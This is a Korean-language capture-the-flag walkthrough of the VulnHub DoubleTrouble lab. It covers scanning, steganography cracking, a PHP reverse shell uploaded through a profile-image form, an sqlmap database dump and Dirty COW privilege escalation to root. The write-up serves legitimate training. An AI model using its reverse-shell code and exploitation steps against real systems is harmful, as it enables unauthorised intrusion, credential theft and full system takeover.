# 🔐 DoubleTrouble — VulnHub CTF Writeup

<img width="365" height="499" alt="스크린샷 2026-05-28 090919" src="https://github.com/user-attachments/assets/335651df-7a41-4406-a6d0-6f13fc6c078c" />


> **난이도**: Intermediate  
> **머신**: [DoubleTrouble @ VulnHub](https://www.vulnhub.com/entry/doubletrouble-1,743/)  
> **목표**: User → Root 권한 획득

---

## 📋 목차

1. [환경 설정 & 네트워크 스캔](#1-환경-설정--네트워크-스캔)
2. [포트 스캔](#2-포트-스캔)
3. [웹 디렉토리 열거](#3-웹-디렉토리-열거)
4. [스테가노그래피 분석](#4-스테가노그래피-분석)
5. [웹 로그인 & 리버스 쉘 업로드](#5-웹-로그인--리버스-쉘-업로드)
6. [권한 상승 (sudo -l)](#6-권한-상승-sudo--l)
7. [두 번째 머신 — SQLMap으로 자격증명 탈취](#7-두-번째-머신--sqlmap으로-자격증명-탈취)
8. [Dirty COW (CVE-2016-5195) — Root 탈취](#8-dirty-cow-cve-2016-5195--root-탈취)

---

## 1. 환경 설정 & 네트워크 스캔

네트워크 대역에서 살아있는 호스트를 먼저 확인합니다.

```bash
sudo nmap -sn 172.16.11.0/24
```

---

## 2. 포트 스캔

타겟 IP에 대해 전체 포트 + 서비스/버전 스캔을 수행합니다.

```bash
sudo nmap -sC -A -p- 172.16.11.219
```

---

## 3. 웹 디렉토리 열거

숨겨진 경로를 찾기 위해 Gobuster로 디렉토리 브루트포싱을 진행합니다.

```bash
sudo gobuster dir \
  -u http://172.16.11.219 \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

---

## 4. 스테가노그래피 분석

웹에서 발견한 `doubletrouble.jpg` 이미지에 데이터가 숨겨져 있는지 확인합니다.

### 4-1. 도구 설치

```bash
# steghide 크랙 도구 설치
sudo apt install stegseek

# rockyou wordlist 압축 해제
sudo apt install -y gzip
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# wordlist 끝부분 확인 (정상 해제 여부 체크)
sudo tail /usr/share/wordlists/rockyou.txt
```

> **stegseek**: steghide로 숨겨진 데이터를 암호 없이 크랙할 때 사용하는 도구입니다.

### 4-2. 스테가노그래피 크랙

```bash
sudo stegseek Downloads/doubletrouble.jpg \
  -wl /usr/share/wordlists/rockyou.txt \
  -xf extracted_data.txt
```

### 4-3. 추출된 데이터 확인

```bash
mv ~/Downloads/* ~
cat extracted_data.txt
```

**결과 (추출된 자격증명):**

```
otisrush@localhost.com
otis666
```

---

## 5. 웹 로그인 & 리버스 쉘 업로드

### 5-1. 로그인

획득한 자격증명으로 웹 애플리케이션에 로그인합니다.

```
ID: otisrush@localhost.com
PW: otis666
```

로그인 후 **My Account** 메뉴로 이동합니다.

### 5-2. PHP 리버스 쉘 생성

> ⚠️ `$ip`는 공격자(Kali) IP로 설정합니다. 타겟 IP가 아닙니다!

```bash
cat <<'EOF' > php-reverse-shell.php
<?php
$ip = '172.16.11.213';  // 공격자(Kali) IP
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(
    0 => $sock,
    1 => $sock,
    2 => $sock
), $pipes);
?>
EOF

cat php-reverse-shell.php
```

### 5-3. 리스너 열기

```bash
nc -lvnp 4444
```

### 5-4. 쉘 업로드 & 실행

프로필 이미지 업로드 기능을 통해 `php-reverse-shell.php`를 업로드합니다.

업로드된 파일 경로:
```
http://172.16.11.219/uploads/users/php-reverse-shell.php
```

브라우저에서 해당 URL에 접근하면 리버스 쉘이 연결됩니다.

<img width="887" height="512" alt="스크린샷 2026-05-28 133750" src="https://github.com/user-attachments/assets/99ccb1f8-affa-4116-83eb-347b65bde253" />


### 5-5. TTY 쉘 업그레이드

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 5-6. sudo 권한 확인

```bash
sudo -l
```

> 결과를 통해 sudo로 실행 가능한 명령어를 확인합니다. (스크린샷 첨부 권장)

<img width="897" height="680" alt="스크린샷 2026-05-28 134038" src="https://github.com/user-attachments/assets/b5dc84fb-39ba-4e3c-9088-2dbe4edec6e7" />
<img width="890" height="683" alt="스크린샷 2026-05-28 134027" src="https://github.com/user-attachments/assets/70809a13-9ac1-4c1c-8f23-d67da360c1a5" />


---

## 6. 두 번째 머신 — SQLMap으로 자격증명 탈취

두 번째 OVA 머신을 내려받아 구동합니다.

```
http://172.16.11.219:8000/doubletrouble.ova
```

<img width="325" height="140" alt="스크린샷 2026-05-28 140521" src="https://github.com/user-attachments/assets/a048877b-0c41-4dec-b158-4c88a6de1bdb" />


### 6-1. SQLMap 자동 인젝션

```bash
# DB 목록 열거
sudo sqlmap -u "http://172.16.11.220/index.php" --forms --dbs

# doubletrouble DB의 테이블 열거
sudo sqlmap -u "http://172.16.11.220/index.php" \
  --forms -D doubletrouble --tables

# users 테이블 덤프
sudo sqlmap -u "http://172.16.11.220/index.php" \
  --forms -D doubletrouble -T users --dump
```

<img width="645" height="285" alt="스크린샷 2026-05-28 141024" src="https://github.com/user-attachments/assets/50441c0c-e54b-4887-b2fe-dd0ed116a4e0" />



**결과:** `clapton` 계정 자격증명 획득

### 6-2. SSH 접속 (known_hosts 초기화)

이전에 저장된 지문이 달라 접속이 막힐 경우, 아래 명령으로 기존 기록을 삭제합니다.

```bash
ssh-keygen -f "/home/red/.ssh/known_hosts" -R "172.16.11.220"
```

> 이 명령은 예전에 저장된 서버 지문 기록을 삭제해 다음 접속 때 새 지문을 정상 등록할 수 있도록 합니다.

```bash
ssh clapton@172.16.11.220
```

---

## 7. Dirty COW (CVE-2016-5195) — Root 탈취

### 7-1. 커널 버전 & 취약점 확인

```bash
uname -a
# Linux ... 3.2.0-4-amd64 ...
```

검색 키워드: `linux 3.2.0-4 amd64 privilege escalation`

**발견된 취약점:**

| 항목 | 내용 |
|------|------|
| 이름 | **Dirty COW** |
| CVE | [CVE-2016-5195](https://www.exploit-db.com/exploits/40839) |
| 설명 | 커널 메모리 서브시스템의 Copy-On-Write(COW) 경쟁 조건 취약점으로, 비권한 로컬 사용자가 읽기 전용 메모리에 쓰기 권한을 얻어 root로 권한 상승 가능 |

> **CVE(Common Vulnerabilities and Exposures)**: 공개된 보안 취약점에 부여되는 고유 식별 번호입니다.

### 7-2. 익스플로잇 코드 다운로드

[https://www.exploit-db.com/exploits/40839](https://www.exploit-db.com/exploits/40839) 에서 소스코드를 복사합니다.

### 7-3. 공격자(Kali)에서 컴파일 파일 준비

```bash
# dirty.c 파일 작성 (복사한 소스코드 붙여넣기 후 Ctrl+D)
cat > dirty.c
# (소스코드 전체 붙여넣기)
# Ctrl + D 로 저장

# 파일 크기 확인 (2KB~5KB 정도여야 정상)
ls -lh dirty.c
```

### 7-4. 타겟 서버로 전송

```bash
scp dirty.c clapton@172.16.11.220:/home/clapton/
```

<img width="627" height="133" alt="스크린샷 2026-05-28 142252" src="https://github.com/user-attachments/assets/39c0f5e3-741a-4eb5-9010-9f6cce95b2bb" />


### 7-5. 타겟 서버에서 컴파일 & 실행

```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

### 7-6. firefart로 root 접속

익스플로잇 성공 시, 코드 내부에 정의된 `firefart` 계정(uid=0, gid=0)이 생성됩니다.

```c
// dirty.c 내부 설정
user.username = "firefart";
user.user_id  = 0;   // root
user.group_id = 0;   // root
```

```bash
su firefart
# (./dirty 실행 시 설정한 패스워드 입력)

whoami
# firefart (= root)
```

<img width="644" height="394" alt="스크린샷 2026-05-28 144122" src="https://github.com/user-attachments/assets/a8762ac9-b655-44be-8871-13565eccdec4" />


### 7-7. passwd 원상 복구

```bash
mv /tmp/passwd.bak /etc/passwd
```

---

## 🏁 공략 완료

| 단계 | 내용 |
|------|------|
| 정보 수집 | nmap, gobuster |
| 자격증명 획득 | stegseek (스테가노그래피) |
| 초기 침투 | PHP 리버스 쉘 업로드 |
| 횡적 이동 | SQLMap DB 덤프 → SSH |
| 권한 상승 | Dirty COW (CVE-2016-5195) |
| 최종 결과 | **root 획득** ✅ |

---

## 🔗 참고 링크

- [DoubleTrouble @ VulnHub](https://www.vulnhub.com/entry/doubletrouble-1,743/)
- [Dirty COW Exploit (Exploit-DB #40839)](https://www.exploit-db.com/exploits/40839)
- [CVE-2016-5195 상세](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)
- [stegseek GitHub](https://github.com/RickdeJager/stegseek)
- [SQLMap 공식 문서](https://sqlmap.org/)
